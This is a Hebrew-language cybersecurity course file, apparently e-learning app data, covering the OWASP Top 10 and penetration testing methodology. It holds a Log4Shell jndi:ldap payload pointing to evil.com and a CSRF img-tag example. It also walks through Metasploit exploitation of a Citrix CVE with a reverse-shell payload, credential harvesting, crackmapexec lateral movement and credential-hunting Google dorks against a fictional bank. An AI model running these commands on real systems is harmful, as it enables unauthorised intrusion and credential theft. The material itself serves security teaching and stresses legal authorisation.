<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px;margin:16px 0;">

<div style="background:#1e293b;border-right:4px solid #ef4444;border-radius:8px;padding:12px;">
<p style="margin:0;"><strong>A01 — <code>Broken Access Control</code></strong> 🥇</p>
<p style="margin:4px 0;font-size:0.9em;">עלה ממקום 5 למקום 1. 94% מהאפליקציות נבדקו ונמצאו פגיעות.</p>
<p style="margin:4px 0;font-size:0.85em;color:#94a3b8;">דוגמה: <code>IDOR</code> — שנה /api/orders/<strong>1234</strong> ל-<strong>1235</strong> ותראה הזמנה של מישהו אחר.</p>
</div>

<div style="background:#1e293b;border-right:4px solid #f97316;border-radius:8px;padding:12px;">
<p style="margin:0;"><strong>A02 — <code>Cryptographic Failures</code></strong></p>
<p style="margin:4px 0;font-size:0.9em;">סיסמאות ב-plaintext, HTTP במקום HTTPS, הצפנה חלשה.</p>
<p style="margin:4px 0;font-size:0.85em;color:#94a3b8;">דוגמה: <code>MD5</code> לhashing סיסמאות (נשבר תוך שניות).</p>
</div>

<div style="background:#1e293b;border-right:4px solid #eab308;border-radius:8px;padding:12px;">
<p style="margin:0;"><strong>A03 — <code>Injection</code></strong></p>
<p style="margin:4px 0;font-size:0.9em;">SQLi, NoSQLi, OS Command Injection, LDAP Injection.</p>
<p style="margin:4px 0;font-size:0.85em;color:#94a3b8;">ירד ממקום 1 למקום 3 — הודות ל-ORMs ו-frameworks מודרניים.</p>
</div>

<div style="background:#1e293b;border-right:4px solid #22c55e;border-radius:8px;padding:12px;">
<p style="margin:0;"><strong>A04 — <code>Insecure Design</code></strong> 🆕</p>
<p style="margin:4px 0;font-size:0.9em;">חדש ב-2021. בעיות עיצוב שאף כמות קוד לא תתקן.</p>
<p style="margin:4px 0;font-size:0.85em;color:#94a3b8;">דוגמה: אפשרות לאפס סיסמה בלי לוודא זהות.</p>
</div>

<div style="background:#1e293b;border-right:4px solid #3b82f6;border-radius:8px;padding:12px;">
<p style="margin:0;"><strong>A05 — <code>Security Misconfiguration</code></strong></p>
<p style="margin:4px 0;font-size:0.9em;">Default passwords, S3 buckets פתוחים, verbose error messages.</p>
<p style="margin:4px 0;font-size:0.85em;color:#94a3b8;">דוגמה: <code>DEBUG=True</code> בפרודקשן שחושף stack traces.</p>
</div>

<div style="background:#1e293b;border-right:4px solid #8b5cf6;border-radius:8px;padding:12px;">
<p style="margin:0;"><strong>A06 — <code>Vulnerable Components</code></strong></p>
<p style="margin:4px 0;font-size:0.9em;">ספריות עם CVEs ידועות. Log4Shell (2021) הוא הדוגמה המושלמת.</p>
<p style="margin:4px 0;font-size:0.85em;color:#94a3b8;">פתרון: <code>npm audit</code>, <code>Dependabot</code>, <code>Snyk</code>.</p>
</div>

<div style="background:#1e293b;border-right:4px solid #ec4899;border-radius:8px;padding:12px;">
<p style="margin:0;"><strong>A07 — <code>Auth & Session Failures</code></strong></p>
<p style="margin:4px 0;font-size:0.9em;">סיסמאות חלשות, session fixation, JWT none algorithm.</p>
<p style="margin:4px 0;font-size:0.85em;color:#94a3b8;">דוגמה: JWT עם <code>alg: "none"</code> = כל אחד מזייף tokens.</p>
</div>

<div style="background:#1e293b;border-right:4px solid #14b8a6;border-radius:8px;padding:12px;">
<p style="margin:0;"><strong>A08 — <code>Software Integrity</code></strong> 🆕</p>
<p style="margin:4px 0;font-size:0.9em;">SolarWinds — עדכון רשמי שהוזרק לו backdoor.</p>
<p style="margin:4px 0;font-size:0.85em;color:#94a3b8;">פתרון: <code>code signing</code>, <code>SBOM</code>, CI/CD hardening.</p>
</div>

<div style="background:#1e293b;border-right:4px solid #64748b;border-radius:8px;padding:12px;">
<p style="margin:0;"><strong>A09 — <code>Logging & Monitoring Failures</code></strong></p>
<p style="margin:4px 0;font-size:0.9em;">בלי logs = לא יודעים שנפרצנו. ממוצע זמן גילוי: 277 ימים.</p>
<p style="margin:4px 0;font-size:0.85em;color:#94a3b8;">דוגמה: Equifax — הפריצה נמשכה 76 ימים לפני הגילוי.</p>
</div>

<div style="background:#1e293b;border-right:4px solid #f43f5e;border-radius:8px;padding:12px;">
<p style="margin:0;"><strong>A10 — <code>SSRF</code></strong> 🆕</p>
<p style="margin:4px 0;font-size:0.9em;">Server-Side Request Forgery — השרת פונה ל-URL שהתוקף בחר.</p>
<p style="margin:4px 0;font-size:0.85em;color:#94a3b8;">דוגמה: Capital One 2019 — SSRF חשף AWS metadata → 100M רשומות.</p>
</div>

<div class="mini-cards">
<div class="mini-card"><div class="mini-card-icon">🥇</div><div class="mini-card-title">A01 Broken Access</div><div class="mini-card-desc">IDOR, missing authz — 94% מהאפליקציות פגיעות</div></div>
<div class="mini-card"><div class="mini-card-icon">🔐</div><div class="mini-card-title">A02 Crypto Failures</div><div class="mini-card-desc">הצפנה חלשה, HTTP, סיסמאות plaintext</div></div>
<div class="mini-card"><div class="mini-card-icon">💉</div><div class="mini-card-title">A03 Injection</div><div class="mini-card-desc">SQLi, NoSQLi, OS Command, LDAP</div></div>
<div class="mini-card"><div class="mini-card-icon">📐</div><div class="mini-card-title">A04 Insecure Design</div><div class="mini-card-desc">בעיות עיצוב שאף קוד לא יתקן</div></div>
<div class="mini-card"><div class="mini-card-icon">⚙️</div><div class="mini-card-title">A05 Misconfiguration</div><div class="mini-card-desc">Default passwords, S3 פתוח, DEBUG=True</div></div>
<div class="mini-card"><div class="mini-card-icon">📦</div><div class="mini-card-title">A06 Vulnerable Components</div><div class="mini-card-desc">ספריות עם CVEs — Log4Shell</div></div>
<div class="mini-card"><div class="mini-card-icon">🔑</div><div class="mini-card-title">A07 Auth Failures</div><div class="mini-card-desc">JWT none, session fixation, brute force</div></div>
<div class="mini-card"><div class="mini-card-icon">🔗</div><div class="mini-card-title">A08 Software Integrity</div><div class="mini-card-desc">Supply chain — SolarWinds backdoor</div></div>
<div class="mini-card"><div class="mini-card-icon">📋</div><div class="mini-card-title">A09 Logging Failures</div><div class="mini-card-desc">בלי logs = לא יודעים שנפרצנו</div></div>
<div class="mini-card"><div class="mini-card-icon">🌐</div><div class="mini-card-title">A10 SSRF</div><div class="mini-card-desc">השרת פונה ל-URL של התוקף — Capital One 2019</div></div>
</div>

<div class="chapter-summary"><h4>📋 סיכום פרק 103</h4><ul>
<li><strong>SQL Injection</strong> — הזרקת SQL דרך קלט משתמש. הגנה: Parameterized Queries בלבד</li>
<li><strong>XSS</strong> — הזרקת JavaScript לדפדפן. 3 סוגים: Reflected, Stored, DOM-Based. הגנה: Escaping + CSP</li>
<li><strong>CSRF</strong> — ניצול cookies אוטומטיים לבקשות cross-site. הגנה: CSRF Token + SameSite</li>
<li><strong>OWASP Top 10</strong> — #1 Broken Access Control (94% פגיעים), #3 Injection ירד בזכות frameworks</li>
</ul></div>

</div>
</div>`
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – האם תוכל לפרוץ לעצמך?",
        intro: "<p>הדרך הטובה ביותר ללמוד אבטחה היא לחשוב כמו תוקף. הנה כמה תרגילים מנטליים...</p>",
        blocks: [
          {
            title: "תרגיל: פרוץ לאפליקציה שלך",
            icon: "🎯",
            content: "קח פרויקט שכתבת — אתר, API, אפליקציה. עכשיו תחשוב: אם היית רוצה לגנוב ממנו נתונים, איך היית עושה? בדוק: האם יש input שלא מסונן? האם ה-API מחזיר יותר מידע ממה שצריך? האם יש IDOR? האם cookies מוגדרים עם HttpOnly? זו בדיוק החשיבה של pentester — ואתה יכול לעשות את זה על הקוד שלך עצמו."
          },
          {
            title: "הפרדוקס של הפשטות",
            icon: "🧩",
            content: "SQL Injection קיימת מ-1998. XSS מ-1999. CSRF מ-2001. ובכל זאת, ב-2024, הן עדיין בראש רשימת OWASP. למה? כי מפתחים לומדים frameworks — לא לומדים אבטחה. Framework מודרני (React, Django) מגן עליך by default, אבל ברגע שעוקפים את ברירות המחדל (dangerouslySetInnerHTML, raw SQL) — חוזרים ל-1998."
          },
          {
            title: "חשוב: Zero-Day Economy",
            icon: "💰",
            content: "Zero-day exploit של iPhone שווה עד $2M בשוק השחור (Zerodium). ממשלות קונות. חברות ביון קונות. זו תעשייה של מיליארדים. השאלה: האם עדיף שחוקר שמגלה zero-day ימכור אותו לממשלה ב-$2M, או ידווח ליצרן ויקבל $200K bug bounty? מה טוב יותר לעולם?"
          },
          {
            title: "מבחן: מה עדיף — WAF או קוד נכון?",
            icon: "🤔",
            content: "WAF (Web Application Firewall) סורק תעבורה ומנסה לזהות מתקפות. אבל תוקפים מוצאים bypasses כל הזמן. קוד עם Parameterized Queries לא צריך WAF — הוא מוגן by design. אז למה בכלל צריך WAF? כי legacy code קיים. כי צד שלישי. כי טעויות אנוש. WAF הוא כמו חגורת בטיחות — לא תחליף נהיגה זהירה, אבל תציל אותך כשתטעה."
          }
        ]
      },
      {
        type: "questions",
        title: "שאלות — OWASP Top 10",
        titleEn: "Questions — OWASP Top 10",
        questions: [
          {
            q: "מה ההבדל בין Reflected XSS ל-Stored XSS? איזה מסוכן יותר ולמה?",
            a: "Reflected XSS — הסקריפט הזדוני נמצא ב-URL (או ב-request) וחוזר בתגובה. דורש שהקורבן ילחץ על לינק ספציפי.\n\nStored XSS — הסקריפט נשמר ב-DB (תגובה בפורום, פרופיל, הודעה) ורץ אוטומטית לכל מי שנכנס לדף.\n\nעיקרי:\n- Stored XSS מסוכן יותר כי:\n  1. לא צריך לשכנע קורבנות ללחוץ על לינק\n  2. פוגע בכל מי שנכנס לדף — מאות/אלפי קורבנות\n  3. קשה יותר לזהות — הקורבן לא עושה שום דבר חריג\n\nטיפ:\nMySpace Worm (2005) היה Stored XSS שהדביק מיליון פרופילים ב-20 שעות.",
            qEn: "What's the difference between Reflected and Stored XSS? Which is more dangerous and why?",
            aEn: "Reflected XSS: script in URL, requires victim to click. Stored XSS: script saved in DB, runs for everyone who visits. Stored is more dangerous — mass impact without victim interaction."
          },
          {
            q: "הסבר כיצד CSRF עובד ותן דוגמה לפתרון.",
            a: "CSRF מנצל את העובדה שהדפדפן שולח cookies אוטומטית לכל בקשה לאותו domain.\n\nדוגמה: אתה מחובר לבנק. אתר זדוני מכיל: <img src='https://bank.com/transfer?to=attacker&amount=5000'>. הדפדפן שולח את הבקשה עם ה-cookie שלך — והבנק חושב שזה אתה.\n\nפתרון — CSRF Token:\n- השרת מייצר token ייחודי לכל session\n- Token מוטמע בכל form כ-hidden field\n- השרת מוודא שה-token תואם\n- אתר זדוני לא יכול לדעת את הtoken (Same-Origin Policy)\n\nעיקרי:\n- CSRF Token הוא הפתרון הסטנדרטי\n- SameSite=Strict cookie flag מונע שליחת cookies מcross-site requests\n\nטיפ:\nAPIs מודרניים שמשתמשים ב-Authorization header (Bearer token) במקום cookies — חסינים ל-CSRF by design.",
            qEn: "Explain how CSRF works and give an example solution.",
            aEn: "CSRF exploits automatic cookie sending. Malicious site triggers request to bank.com with victim's cookies. Solution: CSRF tokens — unique per-session tokens validated server-side."
          },
          {
            q: "מהו IDOR ולמה הוא כל כך נפוץ?",
            a: "IDOR = Insecure Direct Object Reference. קטגוריה A01 ב-OWASP.\n\nהתוקף משנה פרמטר בבקשה (ID, filename, path) כדי לגשת לנתונים של משתמש אחר.\n\nדוגמה:\nGET /api/invoices/1001 ← ההזמנה שלך\nGET /api/invoices/1002 ← ההזמנה של מישהו אחר!\n\nלמה נפוץ?\n- מפתחים שוכחים לבדוק הרשאות בצד השרת\n- Frameworks לא מגנים מפני זה אוטומטית\n- קל מאוד ל-automate (סקריפט שמנסה 1000 IDs)\n\nעיקרי:\n- הפתרון: בדיקת הרשאות בכל endpoint\n- \"האם user X מורשה לגשת ל-resource Y?\"\n- ב-2019, חוקר מצא IDOR ב-Facebook שאפשר לצפות בתמונות פרטיות\n\nטיפ:\nהשתמש ב-UUIDs במקום IDs סדרתיים — לא מונע IDOR אבל מקשה על ניחוש.",
            qEn: "What is IDOR and why is it so common?",
            aEn: "IDOR = Insecure Direct Object Reference. Attacker changes ID parameter to access another user's data. Common because developers forget server-side authorization checks, and frameworks don't auto-protect."
          },
          {
            q: "מתקפת Log4Shell (2021) — מהי, ולאיזו קטגוריה ב-OWASP Top 10 היא שייכת?",
            a: "Log4Shell (CVE-2021-44228) הייתה פגיעות קריטית בספריית הלוגים Log4j של Java.\n\nתוקף שולח מחרוזת כמו: ${jndi:ldap://evil.com/exploit} בכל שדה שנרשם ללוג (username, User-Agent, search query). Log4j מפרש את המחרוזת ופונה לשרת התוקף, שמחזיר קוד זדוני שרץ על השרת.\n\nקטגוריה: A06 — Vulnerable and Outdated Components.\n\nעיקרי:\n- Log4j נמצא בכמעט כל אפליקציית Java\n- הפגיעות אפשרה RCE (Remote Code Execution) מלא\n- נוצלה תוך שעות מהפרסום\n- iCloud, Steam, Minecraft, Amazon — כולם היו פגיעים\n\nטיפ:\nזה מדגים למה dependency management (npm audit, Dependabot) הוא קריטי. אתה לא כותב את כל הקוד — אבל אתה אחראי לכל הקוד שרץ.",
            qEn: "What was Log4Shell (2021) and which OWASP Top 10 category does it belong to?",
            aEn: "Log4Shell was a critical RCE in Java's Log4j library. Attacker sends ${jndi:ldap://evil/x} in any logged field. Category: A06 (Vulnerable Components). Affected nearly all Java apps — iCloud, Steam, Amazon."
          }
        ]
      }
    ]
  },

  // ========== CHAPTER 104: Penetration Testing ==========
  {
    id: 104,
    title: "Penetration Testing — מתודולוגיה",
    pages: [
      {
        type: "story",
        title: "שכרו אותך לפרוץ לבנק. חוקית.",
        content: `<div dir="rtl">
<p><strong>יום ראשון, 08:00. משרדי חברת אבטחה בתל אביב.</strong></p>

<p>ישבת על הכיסא שלך וקראת את החוזה שוב. <code>Statement of Work</code> — שני עמודים. כתוב שם בפירוש: "הלקוח מאשר ביצוע <code>Red Team Engagement</code> מלא, כולל <code>social engineering</code>, <code>physical intrusion</code>, ו-<code>network exploitation</code>."</p>

<p>הלקוח: בנק בינלאומי. משך: שבועיים. המטרה: להגיע ל-<code>Domain Controller</code> ולהוכיח גישה לנתוני לקוחות.</p>

<p>החוזה חתום. יש לך "רישיון לפרוץ". אבל יש גבולות ברורים:</p>
<ul>
<li>אסור לפגוע בזמינות מערכות הפרודקשן</li>
<li>אסור לגשת לנתוני לקוחות אמיתיים — רק להוכיח שאפשר</li>
<li>כל פעולה מתועדת — timestamps, screenshots, logs</li>
<li>יש "safe word" — אם הבנק מזהה אותך ואומר "Cardinal" — אתה עוצר מיד</li>
</ul>

<p><strong>יום 1-3: Recon</strong></p>
<p>לא נוגעים בכלום. רק מחפשים מידע. <code>LinkedIn</code> חושף 15 אנשי IT. אחד מהם דחף repo ל-<code>GitHub</code> עם <code>credentials</code> ישנים ב-commit history. <code>Shodan</code> מוצא <code>Citrix Gateway</code> עם CVE ידוע שלא עודכן.</p>

<p><strong>יום 4: Initial Access</strong></p>
<p>מייל <code>phishing</code> מותאם אישית ל-IT Manager — "עדכון דחוף ל-VPN client". Payload: <code>Cobalt Strike</code> beacon. הוא לחץ. יש לכם <code>foothold</code>.</p>

<p><strong>יום 5-8: Lateral Movement</strong></p>
<p><code>BloodHound</code> ממפה את ה-<code>Active Directory</code>. <code>Service Account</code> עם הרשאות מוגזמות. <code>Pass-the-Hash</code> ← <code>Domain Controller</code>. שליטה מלאה.</p>

<div class="incident-timeline">
<div class="timeline-event"><div class="timeline-dot dot-gold"></div><div class="timeline-time">ימים 1-3</div><div class="timeline-desc"><span class="phase-badge phase-gold">Recon</span> איסוף מודיעין — LinkedIn, GitHub credentials, Shodan מוצא Citrix CVE</div></div>
<div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">יום 4</div><div class="timeline-desc"><span class="phase-badge phase-red">Initial Access</span> Phishing מותאם ל-IT Manager — Cobalt Strike beacon מותקן</div></div>
<div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">ימים 5-8</div><div class="timeline-desc"><span class="phase-badge phase-red">Lateral Movement</span> BloodHound ממפה AD, Pass-the-Hash ל-Domain Controller</div></div>
<div class="timeline-event"><div class="timeline-dot dot-green"></div><div class="timeline-time">ימים 9-14</div><div class="timeline-desc"><span class="phase-badge phase-blue">Reporting</span> דוח מפורט עם ממצאים, screenshots, ותוכנית תיקון</div></div>
</div>

<div class="key-point"><strong>💡 הלקח:</strong> הבנק שילם $500K על firewalls. הכניסה הייתה דרך מייל phishing ומידע מ-LinkedIn. טכנולוגיה לבדה לא מגנה על טעויות אנוש.</div>
</div>`
      },
      {
        type: "explanation",
        title: "5 שלבי ה-Pentest — חשיבה כמשימה",
        content: `<div dir="rtl">
<p><strong>Penetration Test הוא לא "הפעלת כלים". זו משימה מובנית עם 5 שלבים.</strong></p>
<p>חשוב על זה כמו מבצע צבאי: סיור → תכנון → ביצוע → ניצול הצלחה → דוח.</p>

<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 400 90" class="content-diagram">
  <defs><marker id="arr" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#64748b"/></marker></defs>
  <rect x="5" y="20" width="65" height="45" rx="6" fill="#1e3a5f" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="37" y="38" text-anchor="middle" font-size="9" fill="#7dd3fc" font-weight="bold">1. Recon</text>
  <text x="37" y="52" text-anchor="middle" font-size="7" fill="#94a3b8">מודיעין</text>
  <line x1="70" y1="42" x2="82" y2="42" stroke="#64748b" stroke-width="1.5" marker-end="url(#arr)"/>
  <rect x="82" y="20" width="65" height="45" rx="6" fill="#14532d" stroke="#22c55e" stroke-width="1.5"/>
  <text x="114" y="38" text-anchor="middle" font-size="9" fill="#86efac" font-weight="bold">2. Scan</text>
  <text x="114" y="52" text-anchor="middle" font-size="7" fill="#94a3b8">סריקה</text>
  <line x1="147" y1="42" x2="159" y2="42" stroke="#64748b" stroke-width="1.5" marker-end="url(#arr)"/>
  <rect x="159" y="20" width="65" height="45" rx="6" fill="#4c1d95" stroke="#a78bfa" stroke-width="1.5"/>
  <text x="191" y="38" text-anchor="middle" font-size="9" fill="#c4b5fd" font-weight="bold">3. Exploit</text>
  <text x="191" y="52" text-anchor="middle" font-size="7" fill="#94a3b8">ניצול</text>
  <line x1="224" y1="42" x2="236" y2="42" stroke="#64748b" stroke-width="1.5" marker-end="url(#arr)"/>
  <rect x="236" y="20" width="65" height="45" rx="6" fill="#78350f" stroke="#fbbf24" stroke-width="1.5"/>
  <text x="268" y="38" text-anchor="middle" font-size="9" fill="#fcd34d" font-weight="bold">4. Post-Exp</text>
  <text x="268" y="52" text-anchor="middle" font-size="7" fill="#94a3b8">העמקה</text>
  <line x1="301" y1="42" x2="313" y2="42" stroke="#64748b" stroke-width="1.5" marker-end="url(#arr)"/>
  <rect x="313" y="20" width="75" height="45" rx="6" fill="#1e293b" stroke="#06b6d4" stroke-width="1.5"/>
  <text x="350" y="38" text-anchor="middle" font-size="9" fill="#67e8f9" font-weight="bold">5. Report</text>
  <text x="350" y="52" text-anchor="middle" font-size="7" fill="#94a3b8">דוח + תיקון</text>
</svg>
</div>

<p><strong>שלב 1 — <span class="phase-badge phase-gold">Reconnaissance</span> (סיור)</strong></p>
<p>אוספים מידע <strong>בלי לגעת במטרה</strong>. שני סוגים:</p>
<ul>
<li><strong>פסיבי:</strong> <code>WHOIS</code>, <code>Google Dorking</code>, <code>LinkedIn</code>, <code>Shodan</code>, GitHub repos, DNS records</li>
<li><strong>אקטיבי:</strong> <code>DNS enumeration</code>, <code>subdomain brute-force</code> — כבר "נוגעים" ברשת</li>
</ul>

<p><strong>שלב 2 — <span class="phase-badge phase-blue">Scanning</span> (סריקה)</strong></p>
<p>מזהים שירותים, גרסאות, חולשות ידועות (<code>CVEs</code>).</p>
<p>כלים: <code>Nmap</code>, <code>Nessus</code>, <code>Nuclei</code>, <code>Masscan</code></p>

<p><strong>שלב 3 — <span class="phase-badge phase-red">Exploitation</span> (ניצול)</strong></p>
<p>מנצלים חולשה שנמצאה כדי לקבל גישה ראשונית (<code>foothold</code>).</p>
<p>כלים: <code>Metasploit</code>, <code>Burp Suite</code>, <code>SQLmap</code>, כתיבת exploits ידנית</p>

<p><strong>שלב 4 — <span class="phase-badge phase-red">Post-Exploitation</span> (העמקה)</strong></p>
<p><code>Privilege Escalation</code> → <code>Lateral Movement</code> → גישה לנכסים קריטיים</p>
<p>כלים: <code>Mimikatz</code>, <code>BloodHound</code>, <code>Cobalt Strike</code>, <code>Rubeus</code></p>

<p><strong>שלב 5 — <span class="phase-badge phase-green">Reporting</span> (דוח)</strong></p>
<p>הדוח הוא המוצר. Pentest ללא דוח טוב = בזבוז כסף.</p>
</div>`
      },
      {
        type: "demo",
        title: "Recon בפעולה — nmap, whois, subfinder",
        content: `<div dir="rtl">
<p><strong>בואו נראה את שלב ה-Recon בפועל.</strong></p>

<div class="tool-card">
<div class="tool-card-icon">🌐</div>
<div class="tool-card-body"><strong>WHOIS</strong><p>שאילתת רישום דומיין — חושף בעלים, registrar, name servers, תאריכי רישום.</p></div>
</div>
<div class="tool-card">
<div class="tool-card-icon">🔎</div>
<div class="tool-card-body"><strong>subfinder</strong><p>כלי גילוי subdomains פסיבי — מחפש ב-Certificate Transparency, DNS, ומנועי חיפוש.</p></div>
</div>
<div class="tool-card">
<div class="tool-card-icon">🔍</div>
<div class="tool-card-body"><strong>Nmap</strong><p>סורק ports ושירותים — מזהה גרסאות, מערכות הפעלה, CVEs ידועות.</p></div>
</div>
<div class="tool-card">
<div class="tool-card-icon">🔦</div>
<div class="tool-card-body"><strong>Google Dorking</strong><p>שימוש באופרטורים מתקדמים של Google לגילוי קבצים רגישים, דפי admin, ו-credentials חשופים.</p></div>
</div>

<p><strong>1. WHOIS — מי הבעלים?</strong></p>
<div class="code-preview"><pre><code>$ whois target-bank.com

Domain Name: TARGET-BANK.COM
Registrar: GoDaddy.com
Updated Date: 2023-01-15
Name Server: ns1.cloudflare.com  ← משתמשים ב-Cloudflare
Name Server: ns2.cloudflare.com
Registrant Org: Target Bank Ltd.
Registrant Country: IL</code></pre></div>

<p><strong>2. DNS Enumeration — גילוי subdomains</strong></p>
<div class="code-preview"><pre><code># subfinder — חיפוש subdomains פסיבי
$ subfinder -d target-bank.com -silent

mail.target-bank.com
vpn.target-bank.com         ← מעניין!
dev.target-bank.com         ← שרת פיתוח חשוף?
api.target-bank.com
staging.target-bank.com     ← staging בפרודקשן!
jenkins.target-bank.com     ← CI/CD חשוף!</code></pre></div>

<p><strong>3. Nmap — סריקת ports ושירותים</strong></p>
<div class="code-preview"><pre><code># סריקה מלאה עם זיהוי גרסאות
$ nmap -sV -sC -O vpn.target-bank.com

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.4
443/tcp  open  https         Citrix Gateway
         |_ http-title: NetScaler AAA
3389/tcp open  ms-wrd-prt    Microsoft Terminal Services
8443/tcp open  ssl/https     Citrix Gateway 13.0-58.32
                              ↑
              CVE-2023-3519 — Critical RCE!

# בדיקת CVEs ספציפיות
$ nmap --script vuln vpn.target-bank.com
| VULNERABLE:
|   CVE-2023-3519: Citrix Gateway RCE
|     Risk factor: CRITICAL (9.8)
|     Unauthenticated remote code execution</code></pre></div>

<p><strong>4. Google Dorking — מידע חשוף</strong></p>
<div class="code-preview"><pre><code># חיפוש קבצים רגישים
site:target-bank.com filetype:pdf "confidential"
site:target-bank.com filetype:xlsx "password"
site:target-bank.com inurl:admin
site:target-bank.com intitle:"index of"

# חיפוש credentials ב-GitHub
"target-bank.com" password OR secret OR key
  filename:.env OR filename:.yml</code></pre></div>

<div class="warning-box"><strong>⚠️ חוקיות:</strong> Recon פסיבי (WHOIS, Google) הוא חוקי. Recon אקטיבי (Nmap scan) <strong>דורש הרשאה כתובה</strong>. סריקת Nmap ללא אישור = עבירה פלילית ברוב המדינות.</div>
</div>`
      },
      {
        type: "demo",
        title: "Exploitation — Metasploit ו-Shell",
        content: `<div dir="rtl">
<p><strong>מצאנו חולשה. עכשיו — ניצול.</strong></p>

<div class="tool-card">
<div class="tool-card-icon">💣</div>
<div class="tool-card-body"><strong>Metasploit Framework</strong><p>פלטפורמת exploitation מובילה — 2,400+ exploits, payloads, auxiliary modules. הסטנדרט בתעשיית ה-pentesting.</p></div>
</div>
<div class="tool-card">
<div class="tool-card-icon">🐚</div>
<div class="tool-card-body"><strong>Meterpreter</strong><p>Payload מתקדם של Metasploit — shell אינטראקטיבי בזיכרון בלבד. תומך בהעלאת קבצים, screenshots, pivoting, ועוד.</p></div>
</div>

<p><strong>Metasploit — Framework ל-Exploitation</strong></p>
<div class="code-preview"><pre><code># הפעלת Metasploit Console
$ msfconsole

     =[ metasploit v6.3.55-dev ]
+ -- --=[ 2397 exploits - 1235 auxiliary ]
+ -- --=[ 419 payloads - 48 encoders ]

# חיפוש exploit ל-Citrix CVE
msf6> search CVE-2023-3519

Matching Modules
================
   #  Name                                         Rank
   -  ----                                         ----
   0  exploit/linux/http/citrix_adc_rce_2023_3519  excellent

# בחירת ה-exploit
msf6> use exploit/linux/http/citrix_adc_rce_2023_3519

# הגדרת פרמטרים
msf6 exploit(citrix)> set RHOSTS vpn.target-bank.com
msf6 exploit(citrix)> set RPORT 443
msf6 exploit(citrix)> set LHOST 10.0.0.50
msf6 exploit(citrix)> set PAYLOAD linux/x64/meterpreter/reverse_tcp

# הפעלה
msf6 exploit(citrix)> run

[*] Started reverse TCP handler on 10.0.0.50:4444
[*] Sending exploit...
[+] Exploit completed! Session 1 opened

# יש לנו shell!
meterpreter> sysinfo
Computer     : CTX-GW-01
OS           : Citrix ADC 13.0
Architecture : x64
Meterpreter  : x64/linux

meterpreter> getuid
Server username: nsroot     ← root access!</code></pre></div>

<p><strong>Post-Exploitation — מה עושים אחרי שנכנסנו?</strong></p>
<div class="code-preview"><pre><code># 1. Privilege Escalation — כבר root, מעולה

# 2. Network Discovery — מה עוד יש ברשת?
meterpreter> run post/multi/gather/ping_sweep
  RHOSTS => 10.10.0.0/24

[+] 10.10.0.1   - DC-01 (Domain Controller!)
[+] 10.10.0.15  - DB-PROD-01 (Production DB!)
[+] 10.10.0.22  - FILE-SRV-01

# 3. Credential Harvesting
meterpreter> run post/multi/gather/credentials
[+] Found credentials:
    svc_backup : P@ssw0rd2023!   ← Service Account!

# 4. Lateral Movement — נכנסים ל-DC
$ crackmapexec smb 10.10.0.1 \\
    -u svc_backup -p 'P@ssw0rd2023!' \\
    --shares
SMB  10.10.0.1  [+] BANK\\svc_backup:P@ssw0rd2023!
                    (Pwn3d!)    ← Domain Admin!</code></pre></div>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> שים לב — כל שלב מתועד בדוח: timestamps, screenshots, commands. Pentest ללא תיעוד = חסר ערך.</div>
</div>`
      },
      {
        type: "explanation",
        title: "Rules of Engagement — הקו האדום",
        content: `<div dir="rtl">
<p><strong>ההבדל בין Pentester לפושע הוא מסמך אחד: ה-<code>Rules of Engagement</code>.</strong></p>

<p>לפני שנוגעים במקלדת, חייב להיות חוזה שמגדיר:</p>

<table class="content-table">
  <tr><th>סעיף</th><th>מה מגדיר</th><th>דוגמה</th></tr>
  <tr><td><code>Scope</code></td><td>מה <strong>מותר</strong> לתקוף</td><td>*.target-bank.com, 10.10.0.0/24</td></tr>
  <tr><td><code>Out of Scope</code></td><td>מה <strong>אסור</strong></td><td>Production DB, customer data</td></tr>
  <tr><td><code>Testing Window</code></td><td>מתי</td><td>א-ה, 09:00-18:00, לא בחגים</td></tr>
  <tr><td><code>Contact</code></td><td>למי מדווחים</td><td>CISO: 050-xxx, SOC: soc@bank.com</td></tr>
  <tr><td><code>Emergency Stop</code></td><td>מילת קוד לעצירה</td><td>"Cardinal" = עצור הכל מיד</td></tr>
  <tr><td><code>Allowed Methods</code></td><td>טכניקות מאושרות</td><td>Network, Web, Phishing — ללא Physical</td></tr>
  <tr><td><code>Data Handling</code></td><td>מה עושים עם ממצאים</td><td>מוצפן ב-AES-256, נמחק אחרי 30 יום</td></tr>
</table>

<p><strong>סוגי מבדקים:</strong></p>
<div class="vs-container">
<div class="vs-card vs-good"><h4>📋 White Box</h4><p>מקבלים הכל — קוד מקור, תשתית, credentials. בדיקה יסודית אבל לא מדמה תוקף אמיתי.</p></div>
<div class="vs-card vs-bad"><h4>🕶️ Black Box</h4><p>לא מקבלים שום מידע. מדמה תוקף אמיתי. יקר ואיטי — הבודק מתחיל מאפס.</p></div>
</div>
<div class="info-box"><strong>ℹ️ Gray Box:</strong> מקבלים מידע חלקי (ארכיטקטורה, credentials חלקיים). <strong>האיזון הכי נפוץ</strong> — משלב יסודיות עם סימולציה ריאלית.</div>

<p><strong>הסמכות מקצועיות:</strong></p>
<ul>
<li><code>OSCP</code> (Offensive Security) — הסטנדרט בתעשייה. מבחן מעשי 24 שעות</li>
<li><code>OSEP</code> — Advanced pentesting. Evasion, Active Directory attacks</li>
<li><code>CEH</code> (EC-Council) — תיאורטי יותר, פחות מוערך בתעשייה</li>
<li><code>PNPT</code> (TCM Security) — חדש, מעשי, עלות נמוכה יותר</li>
</ul>

<div class="info-box"><strong>ℹ️ חוקיות:</strong> Pentesting ללא הרשאה = עבירה פלילית. בישראל: חוק המחשבים, 1995. בארה"ב: CFAA. אפילו סריקת <code>Nmap</code> ללא אישור יכולה להיחשב עבירה. <strong>תמיד קבל הרשאה כתובה לפני שמתחילים.</strong></div>
</div>`
      },
      {
        type: "explanation",
        title: "כתיבת דוח Pentest — המוצר האמיתי",
        content: `<div dir="rtl">
<p><strong>Pentest ללא דוח טוב = בזבוז כסף.</strong></p>
<p>הדוח הוא מה שהלקוח משלם עליו. לא ה-hacking — הדוח.</p>

<p><strong>מבנה דוח סטנדרטי:</strong></p>

<p><strong>1. Executive Summary (חצי עמוד)</strong></p>
